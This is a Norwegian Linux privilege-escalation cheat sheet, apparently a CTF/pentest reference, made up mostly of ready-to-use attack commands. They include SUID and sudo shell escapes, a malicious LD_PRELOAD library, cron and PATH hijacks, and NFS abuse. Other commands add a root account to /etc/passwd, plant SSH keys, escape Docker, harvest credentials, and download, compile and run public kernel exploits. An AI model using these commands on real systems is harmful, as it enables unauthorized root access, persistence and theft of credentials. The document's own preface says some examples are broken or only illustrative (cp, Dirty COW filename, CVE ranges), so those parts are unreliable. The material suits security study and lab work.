# 🐧 Rettighetseskalering i Linux – komplett hurtigreferanse

<!-- language-home-navigation -->
[🏠 Norsk startside](../../README.nb.md) • [🌐 Languages](../../README.md#-available-languages)

[🇹🇷 Türkçe Sürüm](README.tr.md) • [🇬🇷 Ελληνικά](README.el.md)

```
  ██╗     ██╗███╗   ██╗██╗   ██╗██╗  ██╗
  ██║     ██║████╗  ██║██║   ██║╚██╗██╔╝
  ██║     ██║██╔██╗ ██║██║   ██║ ╚███╔╝ 
  ██║     ██║██║╚██╗██║██║   ██║ ██╔██╗ 
  ███████╗██║██║ ╚████║╚██████╔╝██╔╝ ██╗
  ╚══════╝╚═╝╚═╝  ╚═══╝ ╚═════╝ ╚═╝  ╚═╝
  ██████╗ ██████╗ ██╗██╗   ██╗███████╗███████╗ ██████╗
  ██╔══██╗██╔══██╗██║██║   ██║██╔════╝██╔════╝██╔════╝
  ██████╔╝██████╔╝██║██║   ██║█████╗  ███████╗██║     
  ██╔═══╝ ██╔══██╗██║╚██╗ ██╔╝██╔══╝  ╚════██║██║     
  ██║     ██║  ██║██║ ╚████╔╝ ███████╗███████║╚██████╗
  ╚═╝     ╚═╝  ╚═╝╚═╝  ╚═══╝  ╚══════╝╚══════╝ ╚═════╝
```

<p align="center">
  <img src="https://img.shields.io/badge/Linux-PrivEsc-red?style=for-the-badge" alt="Linux PrivEsc">
  <img src="https://img.shields.io/badge/Post-Exploitation-orange?style=for-the-badge" alt="Etter utnyttelse">
  <img src="https://img.shields.io/badge/Root-Access-blue?style=for-the-badge" alt="Root">
  <img src="https://img.shields.io/badge/CTF-Ready-green?style=for-the-badge" alt="CTF">
</p>

<p align="center">
  <b>🔓 Komplett veiledning til rettighetseskalering i Linux-systemer</b>
</p>

---

> **Begreper og presisering:** Rettighetseskalering gir høyere rettigheter enn den opprinnelige brukeren. SUID/SGID og capabilities virker under bestemte kjøre- og monteringsvilkår; `nosuid` og `no_new_privs` kan begrense virkningen, og Linux ignorerer SUID/SGID på interpreter-skript. Se [execve-manualen](https://www.man7.org/linux/man-pages/man2/execve.2.html). Shell og programversjon avgjør om rettighetene beholdes. I cp-eksemplet hindrer enkle anførselstegn den viste kommandosubstitusjonen, og den midlertidige passwd-filen er ikke først klargjort; eksemplet er ufullstendig og bevart. `-writable` tester tilgang for gjeldende bruker, ikke nødvendigvis skrivetilgang for alle. NFS-, cron-, PATH- og containerutfall krever flere vilkår enn ett funn. Tabellen over kjernesårbarheter blander komponenttyper: [PwnKit gjelder polkits pkexec](https://blog.qualys.com/vulnerabilities-threat-research/2022/01/25/pwnkit-local-privilege-escalation-vulnerability-discovered-in-polkits-pkexec-cve-2021-4034), og Baron Samedit gjelder sudo. De opprinnelige CVE-/versjonsverdiene er illustrative; backporter og konfigurasjon må vurderes. sudoedit-linjen alene er ikke en full eskaleringsdemonstrasjon. Dirty COW-nedlastingen lagres ikke med navnet som kompileringslinjen forventer. Ingen kommando er reparert eller kjørt.

## 📋 Innholdsfortegnelse

- [Kartlegging](#-kartlegging)
- [SUID/SGID](#-suidsgid)
- [Capabilities (avgrensede Linux-rettigheter)](#-capabilities-avgrensede-linux-rettigheter)
- [Utnyttelse av sudo](#-utnyttelse-av-sudo)
- [Cron-jobber](#-cron-jobber)
- [Kapring av PATH](#-kapring-av-path)
- [Root squashing i NFS](#-root-squashing-i-nfs)
- [Utnyttelse av kjernesårbarheter](#-utnyttelse-av-kjernesårbarheter)
- [Leting etter passord](#-leting-etter-passord)
- [SSH-nøkler](#-ssh-nøkler)
- [Skrivbare filer](#-skrivbare-filer)
- [Containerflukt fra Docker](#-containerflukt-fra-docker)
- [Hurtigreferanse](#-hurtigreferanse)

---

## 🔍 Kartlegging

### Systeminformasjon

```bash
# Vertsnavn
hostname

# Operativsystem og kjerne
cat /etc/os-release
cat /etc/issue
uname -a
uname -r

# Arkitektur
arch
uname -m

# CPU-informasjon
cat /proc/cpuinfo
lscpu
```

### Brukerinformasjon

```bash
# Gjeldende bruker
whoami
id

# Alle brukere
cat /etc/passwd
cat /etc/passwd | grep -v "nologin\|false"

# Brukergrupper
groups
cat /etc/group

# Innloggede brukere
w
who
users

# Sist innlogget
last
lastlog

# Sudo-rettigheter
sudo -l
```

### Nettverksinformasjon

```bash
# IP-adresser
ip a
ifconfig

# Ruter
ip route
route -n

# Åpne porter
netstat -tulpn
ss -tulpn

# Aktive forbindelser
netstat -an
ss -an

# ARP-hurtigbuffer
arp -a
ip neigh

# DNS
cat /etc/resolv.conf

# Verter
cat /etc/hosts
```

### Prosesser og tjenester

```bash
# Prosesser som kjører
ps aux
ps -ef
ps aux | grep root

# Tjenester
systemctl list-units --type=service
service --status-all

# Installerte pakker
dpkg -l                    # Debian/Ubuntu
rpm -qa                    # RHEL/CentOS
```

### Planlagte oppgaver

```bash
# Crontab-filer
crontab -l
ls -la /etc/cron*
cat /etc/crontab
cat /etc/cron.d/*

# Systemd-timere
systemctl list-timers
```

---

## 🔐 SUID/SGID

### Finn binærfiler med SUID

```bash
# Finn filer med SUID
find / -perm -4000 -type f 2>/dev/null
find / -perm -u=s -type f 2>/dev/null

# Finn filer med SGID
find / -perm -2000 -type f 2>/dev/null
find / -perm -g=s -type f 2>/dev/null

# Finn begge
find / -perm /6000 -type f 2>/dev/null
```

### Vanlige SUID-binærfiler som kan utnyttes

Se [GTFOBins](https://gtfobins.github.io/) for metoder som gjelder det aktuelle programmet!

#### **bash**
```bash
# Hvis bash har SUID
./bash -p
```

#### **find**
```bash
find . -exec /bin/sh -p \; -quit
```

#### **vim**
```bash
vim -c ':!/bin/sh'
```

#### **nmap** (eldre versjoner)
```bash
nmap --interactive
!sh
```

#### **python**
```bash
python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
```

#### **perl**
```bash
perl -e 'exec "/bin/sh";'
```

#### **less/more**
```bash
less /etc/passwd
!/bin/sh
```

#### **cp**
```bash
# Kopier /etc/passwd, legg til en root-bruker, og kopier tilbake
LFILE=/etc/passwd
cp /etc/passwd /tmp/passwd.bak
echo 'hacker:$(openssl passwd -1 password):0:0::/root:/bin/bash' >> /tmp/passwd
cp /tmp/passwd $LFILE
```

#### **env**
```bash
env /bin/sh -p
```

---

## ⚡ Capabilities (avgrensede Linux-rettigheter)

### Finn capabilities

```bash
# Hent filenes capabilities
getcap -r / 2>/dev/null

# Vanlige farlige capabilities
# CAP_SETUID – endre UID
# CAP_NET_RAW – rå nettverkssockets
# CAP_DAC_READ_SEARCH – lese filer uten vanlige tilgangskontroller
```

### Utnytt capabilities

#### **Python (cap_setuid)**
```bash
# Hvis python har cap_setuid+ep
python -c 'import os; os.setuid(0); os.system("/bin/bash")'
```

#### **Perl (cap_setuid)**
```bash
perl -e 'use POSIX qw(setuid); setuid(0); exec "/bin/bash";'
```

#### **tar (cap_dac_read_search)**
```bash
# Les en hvilken som helst fil
tar -cvf shadow.tar /etc/shadow
tar -xvf shadow.tar
cat etc/shadow
```

#### **vim (cap_setuid)**
```bash
vim -c ':py import os; os.setuid(0); os.execl("/bin/sh", "sh", "-c", "reset; exec sh")'
```

---

## 🔑 Utnyttelse av sudo

### Kontroller sudo-rettigheter

```bash
sudo -l
# Se etter NOPASSWD-oppføringer
# Se etter oppføringer med (ALL) eller (root)
```

### Utnytt sudo

#### **sudo ALL**
```bash
sudo /bin/bash
sudo su
```

#### **LD_PRELOAD**
```bash
# Hvis env_keep+=LD_PRELOAD finnes i sudo -l
# Opprett et ondsinnet bibliotek

cat > /tmp/shell.c << EOF
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
void _init() {
    unsetenv("LD_PRELOAD");
    setgid(0);
    setuid(0);
    system("/bin/bash");
}
EOF

gcc -fPIC -shared -o /tmp/shell.so /tmp/shell.c -nostartfiles
sudo LD_PRELOAD=/tmp/shell.so /usr/bin/any_allowed_program
```

#### **sudo vim**
```bash
sudo vim -c ':!/bin/sh'
```

#### **sudo less/more**
```bash
sudo less /etc/passwd
!/bin/sh
```

#### **sudo find**
```bash
sudo find /tmp -exec /bin/sh \;
```

#### **sudo nmap** (interaktiv modus)
```bash
sudo nmap --interactive
!sh
```

#### **sudo tar**
```bash
sudo tar cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
```

#### **sudo zip**
```bash
sudo zip /tmp/test.zip /tmp/test -T --unzip-command="sh -c /bin/sh"
```

#### **sudo env**
```bash
sudo env /bin/sh
```

#### **sudo awk**
```bash
sudo awk 'BEGIN {system("/bin/sh")}'
```

#### **sudo man**
```bash
sudo man man
!/bin/sh
```

#### **sudo apache2**
```bash
sudo apache2 -f /etc/shadow
# Lekker første linje fra shadow
```

### Sårbarheter i sudo-versjoner

```bash
# Kontroller versjonen
sudo --version

# CVE-2019-14287 (sudo < 1.8.28)
sudo -u#-1 /bin/bash

# CVE-2021-3156 (Baron Samedit)
# sudo 1.8.2 - 1.8.31p2, 1.9.0 - 1.9.5p1
sudoedit -s '\' $(python3 -c 'print("A"*1000)')
```

---

## ⏰ Cron-jobber

### Finn cron-jobber

```bash
# Systemets crontab
cat /etc/crontab

# Cron-kataloger
ls -la /etc/cron.d/
ls -la /etc/cron.daily/
ls -la /etc/cron.hourly/
ls -la /etc/cron.weekly/
ls -la /etc/cron.monthly/

# Brukernes crontab-filer
cat /var/spool/cron/crontabs/*

# Se etter cron-aktivitet
# Bruk pspy til prosessovervåking
```

### Utnytt cron-jobber

#### **Skrivbart cron-skript**
```bash
# Hvis cron kjører et skript du kan skrive til:
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' >> /path/to/script.sh

# Vent til cron kjører, og deretter:
/tmp/bash -p
```

#### **Injeksjon via jokertegn (tar)**
```bash
# Hvis cron kjører: tar czf /tmp/backup.tar.gz *

# Opprett ondsinnede filer
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > shell.sh
touch "/path/--checkpoint=1"
touch "/path/--checkpoint-action=exec=sh shell.sh"
```

#### **Utnyttelse av PATH**
```bash
# Hvis cron bruker en relativ sti og du kontrollerer PATH
# Crontab viser: PATH=/home/user:/usr/local/bin:...
# Skriptet kaller: backup.sh (uten fullstendig sti)

# Opprett et falskt skript i en skrivbar PATH-katalog
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/backup.sh
chmod +x /home/user/backup.sh
```

---

<a id="-kapring-av-path"></a>
## 🛤️ Kapring av PATH

### Finn sårbare skript

```bash
# Se etter skript kjørt av root som bruker relative stier
# Kontroller SUID-skript
# Kontroller cron-skript
# Kontroller systemd-tjenester
```

### Utnytt PATH

```bash
# Hvis et root-skript kaller 'service' uten fullstendig sti
# og du kontrollerer PATH:

# Opprett en ondsinnet 'service'
echo '/bin/bash -p' > /tmp/service
chmod +x /tmp/service
export PATH=/tmp:$PATH

# Kjør det sårbare skriptet
./vulnerable_script
```

---

## 📁 Root squashing i NFS

### Finn NFS-delinger

```bash
# På angripermaskinen
showmount -e target_ip

# Kontroller eksporterte delinger
cat /etc/exports
# Se etter no_root_squash
```

### Utnytt no_root_squash

```bash
# På angripermaskinen (som root):
mkdir /tmp/nfs
mount -o rw target_ip:/share /tmp/nfs
cp /bin/bash /tmp/nfs/
chmod +s /tmp/nfs/bash

# På målsystemet:
/share/bash -p
```

---

## 💣 Utnyttelse av kjernesårbarheter

### Kontroller kjerneversjonen

```bash
uname -r
uname -a
cat /proc/version
```

### Vanlige eksempler på kjernesårbarheter

| CVE | Kjerneversjon | Navn |
|-----|----------------|------|
| CVE-2016-5195 | 2.x - 4.8.3 | **Dirty COW** |
| CVE-2021-4034 | Alle | **PwnKit** |
| CVE-2021-3156 | sudo < 1.9.5p2 | **Baron Samedit** |
| CVE-2022-0847 | 5.8 - 5.16.11 | **Dirty Pipe** |
| CVE-2022-2588 | 5.x | **DirtyCred** |

### Dirty COW (CVE-2016-5195)
```bash
# Last ned og kompiler
wget https://www.exploit-db.com/download/40839
gcc -pthread 40839.c -o dirty -lcrypt
./dirty
```

### PwnKit (CVE-2021-4034)
```bash
# Last ned
git clone https://github.com/ly4k/PwnKit
cd PwnKit
chmod +x PwnKit
./PwnKit
```

### Dirty Pipe (CVE-2022-0847)
```bash
# Kontroller kjerneversjonen først
uname -r

# Last ned og kompiler
git clone https://github.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits
cd CVE-2022-0847-DirtyPipe-Exploits
bash compile.sh
./exploit-1
```

---

## 🔑 Leting etter passord

### Søk etter passord

```bash
# I filer
grep -r "password" /home/ 2>/dev/null
grep -r "pass" /etc/ 2>/dev/null
grep -ri "password" /var/www/ 2>/dev/null

# Konfigurasjonsfiler
cat /var/www/html/wp-config.php
cat /var/www/html/config.php
cat /etc/mysql/my.cnf

# Historikkfiler
cat ~/.bash_history
cat ~/.mysql_history
cat ~/.nano_history

# Miljøvariabler
env
printenv
```

### Passordfiler

```bash
# Shadow-filen (krever root)
cat /etc/shadow

# Passordhasher fra shadow
unshadow /etc/passwd /etc/shadow > hashes.txt
john hashes.txt
```

### Vanlige plasseringer

```bash
# Webkonfigurasjon
/var/www/html/wp-config.php
/var/www/html/config.php
/var/www/html/.htpasswd

# Databasekonfigurasjon
/etc/mysql/my.cnf
/etc/postgresql/*/main/pg_hba.conf

# SSH
/home/*/.ssh/id_rsa
/root/.ssh/id_rsa

# Sikkerhetskopier
find / -name "*.bak" 2>/dev/null
find / -name "*.backup" 2>/dev/null
```

---

## 🔐 SSH-nøkler

### Finn SSH-nøkler

```bash
# Private nøkler
find / -name "id_rsa" 2>/dev/null
find / -name "id_dsa" 2>/dev/null
find / -name "*.pem" 2>/dev/null

# Autoriserte nøkler
cat /home/*/.ssh/authorized_keys
cat /root/.ssh/authorized_keys
```

### Utnytt SSH-nøkler

```bash
# Hvis du finner en lesbar privat nøkkel:
chmod 600 id_rsa
ssh -i id_rsa user@localhost
ssh -i id_rsa root@localhost
```

### Legg til din egen SSH-nøkkel

```bash
# Generer nøkkelen på angripermaskinen
ssh-keygen -t rsa -b 4096

# Hvis du kan skrive til authorized_keys:
echo "YOUR_PUBLIC_KEY" >> /root/.ssh/authorized_keys
echo "YOUR_PUBLIC_KEY" >> /home/user/.ssh/authorized_keys
```

---

## 📝 Skrivbare filer

### Kritiske skrivbare filer

```bash
# Kontroller skrivetillatelser
ls -la /etc/passwd
ls -la /etc/shadow
ls -la /etc/sudoers
```

### Utnytt skrivbar /etc/passwd

```bash
# Generer en passordhash
openssl passwd -1 -salt hacker password
# Resultat: $1$hacker$TzyKlv0/R/c28R.GAeLw.1

# Legg til en root-bruker
echo 'hacker:$1$hacker$TzyKlv0/R/c28R.GAeLw.1:0:0::/root:/bin/bash' >> /etc/passwd

# Logg inn
su hacker
# Passord: password
```

### Finn filer som er skrivbare for alle

```bash
find / -writable -type f 2>/dev/null
find / -perm -222 -type f 2>/dev/null
find / -perm -o+w -type f 2>/dev/null

# Kataloger som er skrivbare for alle
find / -writable -type d 2>/dev/null
find / -perm -222 -type d 2>/dev/null
```

---

## 🐳 Containerflukt fra Docker

### Kontroller om du er i Docker

```bash
# Se etter .dockerenv
ls -la /.dockerenv

# Kontroller cgroups
cat /proc/1/cgroup | grep docker

# Kontroller vertsnavnet (tilfeldig streng)
hostname
```

### Montert Docker-socket

```bash
# Hvis docker.sock er montert
find / -name docker.sock 2>/dev/null
ls -la /var/run/docker.sock

# Bryt ut via Docker-socketen
docker run -v /:/mnt --rm -it alpine chroot /mnt sh
```

### Privilegert container

```bash
# Hvis containeren er privilegert
fdisk -l                    # Se diskene på verten
mount /dev/sda1 /mnt
chroot /mnt
```

---

## 📊 Hurtigreferanse

### Kartlegging med kommandoer på én linje

```bash
# Rask systeminformasjon
id; hostname; uname -a; cat /etc/issue

# Rask SUID-kontroll
find / -perm -4000 -type f 2>/dev/null

# Rask kontroll av capabilities
getcap -r / 2>/dev/null

# Rask sudo-kontroll
sudo -l

# Rask cron-kontroll
cat /etc/crontab; ls -la /etc/cron*

# Raskt passordsøk
grep -r "password" /home/ 2>/dev/null
```

### Automatiserte verktøy

| Verktøy | Beskrivelse |
|------|-------------|
| **LinPEAS** | Omfattende kartlegging |
| **LinEnum** | Linux-kartlegging |
| **linux-smart-enumeration** | LSE |
| **pspy** | Prosessovervåking |

### Sjekkliste for raske funn

- [ ] `sudo -l` – kontroller sudo-rettigheter
- [ ] SUID-binærfiler – finn dem og kontroller GTFOBins
- [ ] Capabilities – `getcap -r / 2>/dev/null`
- [ ] Cron-jobber – skrivbare skript?
- [ ] Kjerneversjon – kjente sårbarheter?
- [ ] Lesbar /etc/shadow
- [ ] Skrivbar /etc/passwd
- [ ] SSH-nøkler i /home/* eller /root
- [ ] Montert Docker-socket
- [ ] NFS med no_root_squash

---

## 📚 Ressurser

- [GTFOBins](https://gtfobins.github.io/)
- [HackTricks Linux PrivEsc](https://book.hacktricks.xyz/linux-hardening/privilege-escalation)
- [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md)

### Relaterte hurtigreferanser
- LinPEAS – kildeguiden `LinPEAS/README.md` finnes ikke i denne kopien.
- [Rettighetseskalering i Windows](../../Windows-PrivEsc/translations/README.nb.md)

---

<p align="center">
  <b>🐧 Oppnå root-tilgang!</b><br>
  <i>Lær rettighetseskalering i Linux</i>
</p>
